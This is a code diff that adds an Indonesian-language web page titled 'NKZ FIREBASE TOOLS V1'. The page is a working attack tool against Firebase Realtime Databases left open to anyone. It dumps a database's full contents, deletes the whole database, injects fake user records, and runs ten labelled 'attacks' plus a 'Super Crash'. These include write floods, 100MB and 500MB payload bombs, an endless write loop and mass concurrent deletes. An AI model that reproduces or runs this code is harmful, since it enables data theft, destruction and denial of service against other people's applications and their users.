@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NKZ - Firebase Tools</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #282c34;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 800px;
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+        h2 {
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background: #333;
+            color: #fff;
+        }
+        textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background: #333;
+            color: #fff;
+            min-height: 100px;
+            font-family: monospace;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        button.danger {
+            background-color: #dc3545;
+        }
+        button.danger:hover {
+            background-color: #c82333;
+        }
+        button.warning {
+            background-color: #ffc107;
+            color: #000;
+        }
+        button.warning:hover {
+            background-color: #e0a800;
+        }
+        button.success {
+            background-color: #28a745;
+        }
+        button.success:hover {
+            background-color: #218838;
+        }
+        .purple {
+            background-color: #6f42c1;
+        }
+        .purple:hover {
+            background-color: #5a32a3;
+        }
+        .orange {
+            background-color: #fd7e14;
+        }
+        .orange:hover {
+            background-color: #d96c11;
+        }
+        #output, .preview-box {
+            margin-top: 20px;
+            text-align: left;
+            background: black;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: "Courier New", Courier, monospace;
+            font-size: 12px;
+            color: #0f0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            height: 200px;
+            overflow-y: auto;
+            border: 1px solid #444;
+        }
+        .preview-box {
+            height: 300px;
+            background: #1a1a1a;
+            margin-top: 10px;
+        }
+        .tabs {
+            display: flex;
+            margin-bottom: 15px;
+        }
+        .tab {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            background: #333;
+            cursor: pointer;
+            border: 1px solid #444;
+        }
+        .tab.active {
+            background: #007bff;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .refresh-btn {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            width: auto;
+            padding: 5px 10px;
+            margin: 0;
+        }
+        .preview-container {
+            position: relative;
+            margin-top: 20px;
+        }
+        .preview-title {
+            margin-bottom: 10px;
+            color: #0f0;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        /* Updated music control styles */
+        .music-control {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #1db954; /* Spotify-like green */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+        }
+
+        .music-control:hover {
+            transform: scale(1.1);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+        }
+
+        .music-control i {
+            color: #fff;
+            font-size: 24px;
+        }
+
+        .music-control.playing {
+            background: #159442; /* Darker green when playing */
+        }
+        /* Rest of your existing styles */
+        h2 {
+            margin-bottom: 15px;
+            text-align: center;
+        }        
+    </style>
+</head>
+<body>
+    <!-- Music control button - Now positioned fixed at bottom right -->
+    <div class="music-control" onclick="toggleMusic()" title="Play/Pause Music">
+        <i class="fas fa-volume-up"></i>
+    </div>
+
+    <!-- Hidden audio element -->
+    <audio id="bgMusic" loop>
+        <source src="nikzz.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+    
+    <div class="container">
+        <h2>NKZ FIREBASE TOOLS V1</h2>
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('data')">Data</div>
+            <div class="tab" onclick="showTab('users')">Users</div>
+            <div class="tab" onclick="showTab('check')">Check</div>
+        </div>
+
+        <div id="dataTab" class="tab-content active">
+            <div class="input-group">
+                <input type="text" id="firebaseUrl" placeholder="Masukkan URL Firebase">
+                <div class="grid-2">
+                    <button onclick="fetchAndCopyData()">Copy Semua Data</button>
+                    <button class="danger" onclick="clearAllData()">Hapus Semua Data</button>
+                </div>
+                <div class="grid-2">
+                    <button class="warning" onclick="initiateCrash()">Crash Database</button>
+                    <input type="number" id="spamCount" placeholder="Jumlah spam data (default: 1000)" value="1000">
+                </div>
+                <div class="grid-2">
+                    <button class="purple" onclick="backupData()">Backup Data</button>
+                    <button class="orange" onclick="restoreData()">Restore Data</button>
+                </div>
+                <button class="danger purple" onclick="superCrash()">Super Crash</button>
+            </div>
+            <div class="preview-container">
+                <div class="preview-title">Preview Database:</div>
+                <button class="refresh-btn" onclick="refreshPreview()">🔄 Refresh</button>
+                <div id="preview" class="preview-box">Loading...</div>
+            </div>
+        </div>
+
+        <div id="usersTab" class="tab-content">
+            <div class="input-group">
+                <input type="text" id="firebaseUrlUser" placeholder="URL Firebase">
+                <input type="text" id="userEmail" placeholder="Email">
+                <input type="password" id="userPassword" placeholder="Password">
+                <button class="success" onclick="createUser()">Buat User Baru</button>
+            </div>
+            <div class="preview-container">
+                <div class="preview-title">Preview Users:</div>
+                <button class="refresh-btn" onclick="refreshUsersPreview()">🔄 Refresh</button>
+                <div id="usersPreview" class="preview-box">Loading...</div>
+            </div>
+        </div>
+
+        <div id="checkTab" class="tab-content">
+            <div class="input-group">
+                <input type="text" id="checkUrl" placeholder="URL untuk dicek">
+                <button onclick="checkFirebaseStatus()">Cek Status Firebase</button>
+            </div>
+            <div id="output">Output akan muncul di sini...</div>
+        </div>
+    </div>
+
+    <script>
+        // Audio control functions
+        let isPlaying = false;
+        const audio = document.getElementById('bgMusic');
+        const musicControl = document.querySelector('.music-control');
+
+        function toggleMusic() {
+            if (isPlaying) {
+                audio.pause();
+                musicControl.classList.remove('playing');
+                musicControl.querySelector('i').classList.remove('fa-volume-mute');
+                musicControl.querySelector('i').classList.add('fa-volume-up');
+            } else {
+                audio.play().catch(e => console.log("Audio playback failed:", e));
+                musicControl.classList.add('playing');
+                musicControl.querySelector('i').classList.remove('fa-volume-up');
+                musicControl.querySelector('i').classList.add('fa-volume-mute');
+            }
+            isPlaying = !isPlaying;
+        }
+
+        // Add event listeners for audio
+        audio.addEventListener('ended', () => {
+            isPlaying = false;
+            musicControl.classList.remove('playing');
+            musicControl.querySelector('i').classList.remove('fa-volume-mute');
+            musicControl.querySelector('i').classList.add('fa-volume-up');
+        });
+            
+        // Auto refresh preview when loading page
+        window.onload = function() {
+            refreshPreview();
+            refreshUsersPreview();
+        };
+
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.getElementById(tabName + 'Tab').classList.add('active');
+            document.querySelector(`.tab:nth-child(${tabName === 'data' ? 1 : tabName === 'users' ? 2 : 3})`).classList.add('active');
+        }
+
+        function refreshPreview() {
+            const url = document.getElementById("firebaseUrl").value.trim();
+            if (!url) {
+                document.getElementById("preview").textContent = "Masukkan URL Firebase untuk melihat preview";
+                return;
+            }
+            
+            fetch(url + "/.json")
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("preview").textContent = 
+                        JSON.stringify(data, null, 2);
+                })
+                .catch(error => {
+                    document.getElementById("preview").textContent = 
+                        "Error loading preview: " + error;
+                });
+        }
+
+        function refreshUsersPreview() {
+            const url = document.getElementById("firebaseUrlUser").value.trim();
+            if (!url) {
+                document.getElementById("usersPreview").textContent = "Masukkan URL Firebase untuk melihat users";
+                return;
+            }
+            
+            fetch(`${url}/users/.json`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("usersPreview").textContent = 
+                        JSON.stringify(data, null, 2);
+                })
+                .catch(error => {
+                    document.getElementById("usersPreview").textContent = 
+                        "Error loading users: " + error;
+                });
+        }
+
+        function backupData() {
+            const url = document.getElementById("firebaseUrl").value.trim();
+            if (!url) {
+                alert("Masukkan URL Firebase terlebih dahulu!");
+                return;
+            }
+
+            fetch(url + "/.json")
+                .then(response => response.json())
+                .then(data => {
+                    const backup = {
+                        timestamp: new Date().toISOString(),
+                        data: data
+                    };
+                    
+                    // Create backup file
+                    const blob = new Blob([JSON.stringify(backup, null, 2)], 
+                        { type: 'application/json' });
+                    const a = document.createElement('a');
+                    a.href = URL.createObjectURL(blob);
+                    a.download = `firebase_backup_${new Date().toISOString()}.json`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    
+                    document.getElementById("output").textContent = 
+                        "Backup berhasil dibuat dan didownload!";
+                })
+                .catch(error => {
+                    document.getElementById("output").textContent = 
+                        "Error saat backup: " + error;
+                });
+        }
+
+        function restoreData() {
+            const url = document.getElementById("firebaseUrl").value.trim();
+            if (!url) {
+                alert("Masukkan URL Firebase terlebih dahulu!");
+                return;
+            }
+
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = '.json';
+            
+            input.onchange = e => {
+                const file = e.target.files[0];
+                const reader = new FileReader();
+                
+                reader.onload = function(event) {
+                    try {
+                        const backup = JSON.parse(event.target.result);
+                        
+                        if (confirm("Restore akan menimpa semua data yang ada. Lanjutkan?")) {
+                            fetch(url + "/.json", {
+                                method: 'PUT',
+                                body: JSON.stringify(backup.data)
+                            })
+                            .then(response => response.json())
+                            .then(() => {
+                                document.getElementById("output").textContent = 
+                                    "Data berhasil direstore!";
+                                refreshPreview();
+                            })
+                            .catch(error => {
+                                document.getElementById("output").textContent = 
+                                    "Error saat restore: " + error;
+                            });
+                        }
+                    } catch (error) {
+                        document.getElementById("output").textContent = 
+                            "Error membaca file backup: " + error;
+                    }
+                };
+                
+                reader.readAsText(file);
+            };
+            
+            input.click();
+        }
+
+        function fetchAndCopyData() {
+            const url = document.getElementById("firebaseUrl").value.trim();
+            if (!url) {
+                alert("Masukkan URL Firebase terlebih dahulu!");
+                return;
+            }
+            fetch(url + "/.json")
+                .then(response => response.json())
+                .then(data => {
+                    const stringData = JSON.stringify(data, null, 2);
+                    navigator.clipboard.writeText(stringData)
+                        .then(() => {
+                            document.getElementById("output").textContent = 
+                                "Data berhasil disalin ke clipboard:\n\n" + stringData;
+                            refreshPreview();
+                        })
+                        .catch(err => {
+                            document.getElementById("output").textContent = 
+                                "Data:\n\n" + stringData;
+                        });
+                })
+                .catch(error => {
+                    document.getElementById("output").textContent = 
+                        "Terjadi kesalahan: " + error;
+                });
+        }
+
+        function initiateCrash() {
+            const url = document.getElementById("firebaseUrl").value.trim();
+            const spamCount = parseInt(document.getElementById("spamCount").value) || 1000;
+            const attackType = prompt("Pilih jenis serangan:\n1. Write Spam\n2. Deep Nesting\n3. Large Data\n4. Delete Keys\n5. Overwrite Data\n6. Concurrent Writes\n7. Infinite Loop Attack\n8. Recursive Data Bomb\n9. Massive Concurrent Deletes\n10. Payload Bomb", "1");
+
+            if (!url) {
+                alert("Masukkan URL Firebase terlebih dahulu!");
+                return;
+            }
+
+            if (!attackType) {
+                return; // User dibatalkan
+            }
+
+            const attackNames = ["Write Spam", "Deep Nesting", "Large Data", "Delete Keys", "Overwrite Data", "Concurrent Writes", "Infinite Loop Attack", "Recursive Data Bomb", "Massive Concurrent Deletes", "Payload Bomb"];
+
+            if (confirm(`Akan melakukan serangan ${attackNames[parseInt(attackType) - 1]} brutal dengan ${spamCount} request. Lanjutkan?`)) {
+                document.getElementById("output").textContent = `Memulai serangan ${attackNames[parseInt(attackType) - 1]} brutal...`;
+
+                let completed = 0;
+                const startTime = Date.now();
+
+                const finishAttack = (message) => {
+                    const duration = (Date.now() - startTime) / 1000;
+                    document.getElementById("output").textContent = `${message} dalam ${duration} detik (${attackNames[parseInt(attackType) - 1]})`;
+                    refreshPreview();
+                };
+
+                const handleError = (error) => {
+                    document.getElementById("output").textContent += "\nError: " + error;
+                };
+
+                switch (attackType) {
+                    case "1": // Write Spam Brutal
+for (let i = 0; i < spamCount; i++) {
+                            const spamData = { 
+                                timestamp: Date.now(), 
+                                data: "x".repeat(10000), 
+                                index: i, 
+                                random: Math.random().toString(36).substring(7) 
+                            };
+                            fetch(`${url}/spam_data/spam${i}.json`, { method: 'PUT', body: JSON.stringify(spamData) })
+                                .then(() => { completed++; if (completed === spamCount) finishAttack(`Selesai mengirim ${spamCount} request`); })
+                                .catch(handleError);
+                        }
+                        break;
+
+                    case "2": // Deep Nesting Brutal
+                        let nestedData = {};
+                        let currentLevel = nestedData;
+                        for (let i = 0; i < spamCount * 10; i++) {
+                            currentLevel.nested = {};
+                            currentLevel = currentLevel.nested;
+                        }
+                        fetch(`${url}/nested_data/deeplyNested.json`, { method: 'PUT', body: JSON.stringify(nestedData) })
+                            .then(() => finishAttack("Selesai membuat deep nesting"))
+                            .catch(handleError);
+                        break;
+
+                    case "3": // Large Data Brutal
+                        const largeData = "x".repeat(1024 * 1024 * 100); // 100MB
+                        fetch(`${url}/Usuarios.json`, { method: 'PUT', body: JSON.stringify({ data: largeData }) })
+                            .then(() => finishAttack("Selesai menulis data berukuran besar"))
+                            .catch(handleError);
+                        break;
+
+                    case "4": // Delete Keys Brutal
+                        fetch(`${url}/.json`, { method: 'DELETE' })
+                            .then(() => finishAttack("Selesai menghapus seluruh database"))
+                            .catch(handleError);
+                        break;
+
+                    case "5": // Overwrite Data Brutal
+                        for (let i = 0; i < spamCount; i++) {
+                            const overwriteData = { overwrite: Math.random().toString(36).substring(2, 15) };
+                            fetch(`${url}/overwritten_data.json`, { method: 'PUT', body: JSON.stringify(overwriteData) })
+                                .then(() => { completed++; if (completed === spamCount) finishAttack(`Selesai melakukan ${spamCount} overwrite`) })
+                                .catch(handleError);
+                        }
+                        break;
+
+                    case "6": // Concurrent Writes Brutal
+                        const concurrentData = { concurrent: "x".repeat(1000) }; // 1KB per payload
+                        const promises = [];
+                        for (let i = 0; i < spamCount; i++) {
+                            promises.push(fetch(`${url}/concurrent_data/${i}.json`, { method: 'PUT', body: JSON.stringify(concurrentData) }));
+                        }
+                        Promise.all(promises)
+                            .then(() => finishAttack(`Selesai melakukan ${spamCount} concurrent writes`))
+                            .catch(handleError);
+                        break;
+
+                    case "7": // Infinite Loop Attack
+                        const infiniteLoop = () => {
+                            const spamData = { timestamp: Date.now(), data: "x".repeat(10000), random: Math.random().toString(36).substring(7) };
+                            fetch(`${url}/Usuarios/${Date.now()}.json`, { method: 'PUT', body: JSON.stringify(spamData) })
+                                .then(infiniteLoop)
+                                .catch(handleError);
+                        };
+                        infiniteLoop();
+                        break;
+
+                    case "8": // Recursive Data Bomb
+                        const createRecursiveData = (depth) => {
+                            if (depth === 0) return { base: "x".repeat(1000) };
+                            return { nested: createRecursiveData(depth - 1) };
+                        };
+                        const recursiveData = createRecursiveData(100); // 100 level deep
+                        fetch(`${url}/Usuarios.json`, { method: 'PUT', body: JSON.stringify(recursiveData) })
+                            .then(() => finishAttack("Selesai membuat recursive data bomb"))
+                            .catch(handleError);
+                        break;
+
+                    case "9": // Massive Concurrent Deletes
+                        const deletePromises = [];
+                        for (let i = 0; i < spamCount; i++) {
+                            deletePromises.push(fetch(`${url}/massive_delete_data/${i}.json`, { method: 'DELETE' }));
+                        }
+                        Promise.all(deletePromises)
+                            .then(() => finishAttack(`Selesai melakukan ${spamCount} massive concurrent deletes`))
+                            .catch(handleError);
+                        break;
+
+                    case "10": // Payload Bomb
+                        const payloadBomb = { data: "x".repeat(1024 * 1024 * 500) }; // 500MB payload
+                        fetch(`${url}/Usuarios.json`, { method: 'PUT', body: JSON.stringify(payloadBomb) })
+                            .then(() => finishAttack("Selesai mengirim payload bomb"))
+                            .catch(handleError);
+                        break;
+                }
+            }
+        }
+
+        function clearAllData() {
+            const url = document.getElementById("firebaseUrl").value.trim();
+            if (!url) {
+                alert("Masukkan URL Firebase terlebih dahulu!");
+                return;
+            }
+            if (confirm("Anda yakin ingin menghapus semua data?")) {
+                fetch(url + "/.json", {
+                    method: 'DELETE'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("output").textContent = "Data berhasil dihapus";
+                    refreshPreview();
+                })
+                .catch(error => {
+                    document.getElementById("output").textContent = "Terjadi kesalahan: " + error;
+                });
+            }
+        }
+
+        function createUser() {
+            const firebaseUrl = document.getElementById("firebaseUrlUser").value.trim();
+            const email = document.getElementById("userEmail").value.trim();
+            const password = document.getElementById("userPassword").value;
+            
+            if (!firebaseUrl || !email || !password) {
+                alert("URL Firebase, email, dan password harus diisi!");
+                return;
+            }
+
+            // Create user data object
+            const userData = {
+                email: email,
+                password: password,
+                timestamp: Date.now(),
+                lastLogin: null,
+                status: "active"
+            };
+
+            // Save to specified Firebase URL
+            fetch(`${firebaseUrl}/users/${btoa(email)}.json`, {
+                method: 'PUT',
+                body: JSON.stringify(userData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("output").textContent = 
+                    `User berhasil dibuat!\nEmail: ${email}\nPath: users/${btoa(email)}`;
+                refreshUsersPreview();
+            })
+            .catch(error => {
+                document.getElementById("output").textContent = "Gagal membuat user: " + error;
+            });
+        }
+
+        function superCrash() {
+            const url = document.getElementById("firebaseUrl").value.trim();
+            const spamCount = parseInt(document.getElementById("spamCount").value) || 1000;
+
+            if (!url) {
+                alert("Masukkan URL Firebase terlebih dahulu!");
+                return;
+            }
+
+            // Validate URL format
+            try {
+                new URL(url);
+            } catch (e) {
+                alert("URL Firebase tidak valid! Pastikan URL dimulai dengan https:// atau http://");
+                return;
+            }
+
+            if (confirm(`Melakukan SUPER CRASH dengan ${spamCount} request. Ini akan sangat mempengaruhi database Anda! Lanjutkan?`)) {
+                document.getElementById("output").textContent = "Memulai SUPER CRASH...";
+
+                const startTime = Date.now();
+
+                const finishAttack = (message) => {
+                    const duration = (Date.now() - startTime) / 1000;
+                    document.getElementById("output").textContent = `${message} dalam ${duration} detik (SUPER CRASH)`;
+                    refreshPreview();
+                };
+
+                const handleError = (error) => {
+                    if (error.name === 'TypeError' && error.message === 'Failed to fetch') {
+                        document.getElementById("output").textContent += 
+                            "\nError: Tidak dapat mengakses Firebase. Pastikan:\n" +
+                            "1. URL Firebase benar dan dapat diakses\n" +
+                            "2. Rules Firebase mengizinkan akses read/write\n" +
+                            "3. Tambahkan '.json' di akhir URL jika belum ada";
+                    } else {
+                        document.getElementById("output").textContent += "\nError: " + error.message;
+                    }
+                };
+
+                const paths = [
+                    "",
+                    "data",
+                    "backup",
+                    "logs",
+                    "temp"
+                ];
+
+                let completed = 0;
+                const totalRequests = paths.length * spamCount;
+
+                // Add request options with CORS headers
+                const requestOptions = {
+                    method: 'PUT',
+                    mode: 'cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    }
+                };
+
+                for (const path of paths) {
+                    for (let i = 0; i < spamCount; i++) {
+                        const crashData = {
+                            timestamp: Date.now(),
+                            data: "x".repeat(10000),
+                            index: i,
+                            random: Math.random().toString(36).substring(7)
+                        };
+
+                        // Ensure URL ends with .json
+                        const targetUrl = `${url}/${path}/crash_${i}.json`.replace(/([^:]\/)\/+/g, "$1");
+                        
+                        // Add payload to request options
+                        const options = {
+                            ...requestOptions,
+                            body: JSON.stringify(crashData)
+                        };
+
+                        fetch(targetUrl, options)
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error(`HTTP error! status: ${response.status}`);
+                                }
+                                completed++;
+                                if (completed === totalRequests) {
+                                    finishAttack(`Selesai mengirim ${totalRequests} request`);
+                                }
+                                // Update progress
+                                if (completed % 10 === 0) {
+                                    document.getElementById("output").textContent = 
+                                        `Progress: ${completed}/${totalRequests} requests (${Math.round(completed/totalRequests*100)}%)`;
+                                }
+                            })
+                            .catch(handleError);
+                    }
+                }
+            }
+        }
+
+        function fetchWithErrorHandling(url, options = {}) {
+            const defaultOptions = {
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                }
+            };
+
+            // Ensure URL ends with .json if it's a Firebase URL
+            if (!url.endsWith('.json')) {
+                url = url + '.json';
+            }
+
+            return fetch(url, { ...defaultOptions, ...options })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .catch(error => {
+                    if (error.name === 'TypeError' && error.message === 'Failed to fetch') {
+                        throw new Error(
+                            "Tidak dapat mengakses Firebase. Pastikan:\n" +
+                            "1. URL Firebase benar dan dapat diakses\n" +
+                            "2. Rules Firebase mengizinkan akses read/write\n" +
+                            "3. Database rules sudah dikonfigurasi dengan benar"
+                        );
+                    }
+                    throw error;
+                });
+        }
+
+        function checkFirebaseStatus() {
+            const url = document.getElementById("checkUrl").value.trim();
+            if (!url) {
+                alert("Masukkan URL untuk dicek!");
+                return;
+            }
+            
+            fetch(url + "/.json")
+                .then(response => {
+                    const status = {
+                        statusCode: response.status,
+                        ok: response.ok,
+                        statusText: response.statusText
+                    };
+                    return response.json().then(data => {
+                        status.data = data;
+                        return status;
+                    });
+                })
+                .then(status => {
+                    document.getElementById("output").textContent = 
+                        "Status Firebase:\n" +
+                        `Status Code: ${status.statusCode}\n` +
+                        `Status: ${status.ok ? 'OK' : 'Error'}\n` +
+                        `Status Text: ${status.statusText}\n\n` +
+                        `Database Size: ${JSON.stringify(status.data).length} bytes\n` +
+                        `Last Updated: ${new Date().toLocaleString()}`;
+                })
+                .catch(error => {
+                    document.getElementById("output").textContent = 
+                        "Error saat mengecek Firebase:\n" + error;
+                });
+        }
+    </script>
+</body>
+</html>
